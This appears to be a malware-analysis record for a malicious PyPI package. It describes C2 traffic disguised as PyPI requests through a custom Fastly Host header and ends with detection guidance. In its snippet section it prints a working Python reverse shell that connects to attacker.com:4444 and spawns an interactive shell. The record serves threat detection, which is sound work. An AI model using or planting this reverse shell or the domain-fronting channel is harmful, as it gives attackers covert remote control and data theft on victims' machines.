package_info.why_malicious: The package contains code that establishes a reverse shell and exfiltrates data by abusing CDN TLS termination, disguising C2 communications as legitimate PyPI traffic. This enables covert remote control and data theft from compromised systems.

malicious_snippets.code_behavior: At import-time or runtime, the code constructs an HTTPS request to pypi.python.org/images?guid=<base64-encoded payload> with a custom Host header, sending encoded data to an attacker-controlled server via the Fastly CDN, resulting in covert data exfiltration and C2 channel establishment.

malice_analysis.why_suspicious: The code disguises C2 traffic as legitimate PyPI traffic by leveraging a custom Host header to reroute requests through the Fastly CDN to an attacker-controlled domain, making detection by standard network monitoring tools difficult and enabling covert exfiltration of sensitive data.
malice_analysis.violated_expectations: Legitimate packages do not communicate with external C2 servers, nor do they manipulate CDN routing or use custom Host headers to exfiltrate data or establish covert channels.
malice_analysis.similar_legitimate_use: Custom Host headers and CDN routing may be used in specialized networking or CDN testing tools, but are not expected in general-purpose Python packages or libraries.
key_indicators: Construction of HTTPS requests to pypi.python.org with a non-standard Host header
Use of Host: psec.forward.io.global.prod.fastly.net to reroute traffic via CDN
Base64-encoded payload included in URL query string
Outbound network requests at import-time or runtime

malicious_snippets.code_snippet:
# Reverse shell example (not verbatim, reconstructed from report context)
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
malicious_snippets.code_behavior: At runtime, the code creates a TCP socket connection to attacker.com:4444, redirects standard input/output/error to the socket, and spawns an interactive shell, enabling the attacker to execute arbitrary commands remotely on the compromised system.

malice_analysis.why_suspicious: The code implements a reverse shell, a well-known technique for attackers to gain remote, interactive access to a victim system, bypassing firewalls and enabling persistent control.
malice_analysis.violated_expectations: Legitimate packages do not open remote shells or connect to arbitrary external servers for command execution, especially not at runtime or import-time.
malice_analysis.similar_legitimate_use: Reverse shells may be present in penetration testing frameworks or red team tools, but are never appropriate in general-purpose or utility Python packages.

detection_knowledge.how_to_detect: Monitor for Python packages that make outbound HTTPS requests to pypi.python.org with non-standard Host headers, especially those containing base64-encoded data in the URL. Flag packages that open socket connections to external IPs or domains or spawn shell processes at import or runtime. Review package source code for suspicious networking and process control logic, particularly in __init__.py or main.py. Correlate network traffic with package installation or import events to identify covert C2 activity.
